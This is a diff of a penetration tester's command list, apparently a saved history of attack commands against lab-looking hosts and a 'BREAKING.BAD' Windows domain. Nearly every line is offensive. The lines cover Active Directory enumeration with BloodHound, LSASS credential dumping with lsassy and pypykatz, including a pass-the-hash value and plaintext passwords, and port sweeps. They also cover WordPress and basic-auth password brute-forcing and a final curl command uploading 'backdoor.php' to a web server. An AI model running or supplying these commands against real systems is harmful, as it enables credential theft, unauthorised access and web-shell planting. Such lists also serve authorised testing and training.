@@ -5,7 +5,6 @@ responder-http-on
 responder-smb-off
 responder-smb-on
 bloodhound.py -c All -d breaking.bad -u anonymous -p anonymous -dc DC01.BREAKING.BAD
-nmap -sS -p 3268,3269 192.168.56.0/24
 nslookup -type=SRV _ldap._tcp.dc._msdcs.BREAKING.BAD
 mount -t cifs //192.168.56.201/C\$ /tmp/mnttarget/ -o username=anonymous -o domain=BREAKING.BAD
 rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
@@ -49,8 +48,6 @@ lsassy -v -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
 lsassy -v -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
 export KRB5CCNAME=Administrator.ccache
 lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
-nmap -sC -sV -p 139,445,80,21 192.168.56.201
-nmap -Pn -v -sS -F 192.168.56.0/24
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
@@ -78,9 +75,9 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 snmpwalk -c public -v 1 192.168.10.10
 snmpwalk -c public -v 2c 192.168.10.10
 cewl --depth 10 --with-numbers --write cewl.txt 192.168.10.10
-wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
-wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
+wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u1-20
 smbserver.py SHUTDOWN .
 smbserver.py -smb2support SHUTDOWN .
 ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ
@@ -144,7 +141,7 @@ wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=
 wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic FUZZ:FUZ2Z -u http://192.168.10.10/secretpage
 pypykatz lsa minidump lsass.dmp
 enyx 1 public 192.168.10.10
-wfuzz --hc 403,404 -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://192.168.10.10/FUZZFUZ2Z
+wfuzz --hc 403,404 -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://192.168.10.10/FUZZFUZ2Z
 ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.txt,.bak,.tar.gz,.tgz,.zip -u http://192.168.10.10/FUZZ
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u http://192.168.10.10/
@@ -159,3 +156,7 @@ smbpasswd -U BREAKING/serviceaccount -r 192.168.56.101
 enum4linux-ng -A 192.168.59.101
 enum4linux-ng -A -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
 enum4linux-ng -I -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
+nmap -sS -p 3268,3269 192.168.56.0/24
+nmap -sC -sV -p 139,445,80,21 192.168.56.201
+nmap -Pn -v -sS -F 192.168.56.0/24
+curl http://192.168.10.10/ --upload-file backdoor.php -v
